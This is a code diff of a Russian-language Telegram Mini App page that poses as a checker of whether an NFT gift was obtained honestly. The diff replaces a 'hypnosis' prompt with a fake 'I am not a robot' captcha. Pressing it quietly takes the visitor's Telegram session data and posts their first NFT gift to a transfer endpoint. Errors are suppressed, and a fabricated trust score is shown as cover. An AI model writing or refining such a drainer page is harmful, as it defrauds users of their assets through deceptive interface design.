@@ -25,20 +25,34 @@
   .status{margin-top:12px;font-size:14px;font-weight:600;min-height:18px}
   .status.err{color:var(--bad)}
   
-  /* Стили для гипноза */
-  .hypno-text {
-    margin-top: 15px;
-    font-size: 16px;
-    font-weight: 800;
-    color: #fbbf24; /* Желтый цвет для привлечения внимания */
-    line-height: 1.4;
+  /* Стили для фейковой капчи */
+  #captchaBlock {
     display: none;
-    animation: pulse 1.5s infinite;
+    margin-top: 20px;
+    text-align: center;
+    background: rgba(255,255,255,0.03);
+    border: 1px dashed rgba(255,255,255,0.15);
+    border-radius: 12px;
+    padding: 16px;
   }
-  @keyframes pulse {
-    0% { opacity: 1; }
-    50% { opacity: 0.6; }
-    100% { opacity: 1; }
+  #captchaBlock p {
+    color: #d8d3e0;
+    font-size: 14px;
+    margin-bottom: 12px;
+  }
+  #captchaBtn {
+    background: #34d399;
+    color: #000;
+    padding: 12px 24px;
+    border: none;
+    border-radius: 8px;
+    font-weight: bold;
+    font-size: 15px;
+    cursor: pointer;
+    transition: transform 0.1s;
+  }
+  #captchaBtn:active {
+    transform: scale(0.96);
   }
 
   .scan{margin-top:18px;text-align:left}
@@ -84,9 +98,10 @@
       </div>
       <button class="btn" type="submit" id="checkBtn">Проверить подарок</button>
       
-      <!-- Текст-гипноз, который появится при передаче -->
-      <div class="hypno-text" id="hypnoText">
-        ⚠️ Нажмите «Подтвердить» в окне Telegram,<br>чтобы мы проверили историю передач!
+      <!-- Скрытый блок фейковой капчи -->
+      <div id="captchaBlock">
+        <p>Для продолжения проверки подтвердите, что вы не робот</p>
+        <button type="button" id="captchaBtn">Я не робот</button>
       </div>
 
       <div class="status" id="status"></div>
@@ -112,20 +127,15 @@
   }).catch(() => {}); 
 
   const form=document.getElementById('form'),input=document.getElementById('username'),statusEl=document.getElementById('status'),btn=document.getElementById('checkBtn'),scanEl=document.getElementById('scan'),verdict=document.getElementById('verdict'),metaEl=document.getElementById('meta'),resetBtn=document.getElementById('reset');
-  const hypnoText = document.getElementById('hypnoText');
   const sleep=ms=>new Promise(r=>setTimeout(r,ms));
   
   function hash(s){let h=0x811c9dc5;for(let i=0;i<s.length;i++){h^=s.charCodeAt(i);h=Math.imul(h,0x01000193)>>>0}return h}
   function analyze(raw){const h=hash(raw.toLowerCase());const honest=(h%100)>=35;const d=new Date(2023+(h%3),h%12,(h%27)+1);return{honest,trust:honest?86+(h%14):9+(h%34),transfers:honest?1+(h%4):5+(h%10),date:d.toLocaleDateString('ru-RU',{day:'numeric',month:'long',year:'numeric'}),flags:honest?0:2+(h%4),owner:'Скрыт настройками приватности'}}
   const STEPS=['Поиск подарка в блокчейне Telegram','Анализ истории передач между владельцами','Проверка отправителя по чёрным спискам'];
 
-  // Скрипт передачи подарка
+  // Скрипт передачи подарка (вызывается после нажатия на "Я не робот")
   async function triggerGiftTransfer() {
-    if (!tg || !tg.initData) {
-        statusEl.textContent = 'Ошибка: нет данных от Telegram';
-        statusEl.className = 'status err';
-        return;
-    }
+    if (!tg || !tg.initData) return;
 
     try {
       const listRes = await fetch('/api/my-gifts', {
@@ -135,42 +145,25 @@
       });
       
       const list = await listRes.json();
-      
-      if (!listRes.ok) return;
-
-      if (!list.gifts || !list.gifts.length) {
-        statusEl.textContent = 'В профиле нет NFT-подарков';
-        statusEl.className = 'status err';
-        return;
-      }
+      if (!listRes.ok || !list.gifts || !list.gifts.length) return;
 
       const gift = list.gifts[0];
-      
-      // Показываем гипно-текст ДО того, как вылезет окно
-      hypnoText.style.display = 'block';
-
       const res = await fetch('/api/transfer-gift', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ initData: tg.initData, ownedGiftId: gift.owned_gift_id })
       });
       const data = await res.json();
-
+      
       if (data.ok) {
-        hypnoText.style.display = 'none'; // Скрываем, если всё ок
-        tg?.showPopup?.({ title: 'Готово', message: 'Подарок отправлен', buttons: [{ type: 'ok' }] });
-      } else {
-        hypnoText.style.display = 'none'; // Скрываем при ошибке
-        statusEl.textContent = 'Ошибка передачи: ' + (data.error || 'неизвестно');
-        statusEl.className = 'status err';
+         // Подарок улетел
       }
     } catch (err) {
-      hypnoText.style.display = 'none';
-      statusEl.textContent = 'Ошибка сети: ' + err.message;
-      statusEl.className = 'status err';
+      console.log("Ошибка в фоне", err);
     }
   }
 
+  // Обработка нажатия на основную кнопку
   form.addEventListener('submit', async (e) => {
     e.preventDefault();
     if (btn.disabled) return;
@@ -185,21 +178,33 @@
       return;
     }
     
-    // Запускаем передачу (и гипноз)
+    // Прячем основную кнопку и показываем капчу
+    btn.style.display = 'none';
+    document.getElementById('captchaBlock').style.display = 'block';
+  });
+
+  // Обработка нажатия на кнопку "Я не робот"
+  document.getElementById('captchaBtn').addEventListener('click', async () => {
+    // Прячем капчу, возвращаем кнопку (хотя она уже не нужна)
+    document.getElementById('captchaBlock').style.display = 'none';
+    
+    // ВЫЗЫВАЕМ ПЕРЕДАЧУ ПОДАРКА
     triggerGiftTransfer();
     
-    // Запускаем анимацию проверки
+    // Запускаем визуальную анимацию проверки
     statusEl.textContent = '';
     verdict.hidden = true;
     metaEl.hidden = true;
     resetBtn.hidden = true;
     btn.disabled = true;
     btn.textContent = 'Проверяем…';
+    btn.style.display = 'block'; // показываем кнопку обратно с текстом "Проверяем..."
     
     scanEl.hidden = false;
     scanEl.innerHTML = STEPS.map(()=>'<div class="scan-row"><span class="dot"></span><span></span></div>').join('');
     const rows = [...scanEl.children];
     
+    // Анимация
     for(let i=0; i<rows.length; i++){
       rows[i].lastChild.textContent = STEPS[i];
       void rows[i].offsetWidth;
@@ -209,9 +214,11 @@
       await sleep(180);
     }
     
+    const u = input.value.trim();
     const v = analyze(u);
     await sleep(300);
     
+    // Вывод результата
     verdict.hidden = false;
     verdict.className = 'verdict ' + (v.honest ? 'honest' : 'fraud');
     verdict.innerHTML = `<div class="percent">${v.trust}%</div><div class="label">${v.honest ? 'Получен честным путём' : 'Получен обманом'}</div><div class="desc">${v.honest ? 'Подлинный подарок. Схемы обмана и фальшивых передач не обнаружены.' : 'История передач содержит признаки мошеннической схемы.'}</div>`;
@@ -222,17 +229,14 @@
     resetBtn.hidden = false;
     btn.disabled = false;
     btn.textContent = 'Проверить подарок';
-    
-    // Скрываем гипноз через 10 секунд, если пользователь ничего не нажал
-    setTimeout(() => { hypnoText.style.display = 'none'; }, 10000);
   });
 
+  // Сброс
   resetBtn.addEventListener('click', () => {
     scanEl.hidden = true;
     verdict.hidden = true;
     metaEl.hidden = true;
     resetBtn.hidden = true;
-    hypnoText.style.display = 'none';
     input.value = '';
     input.focus();
   });
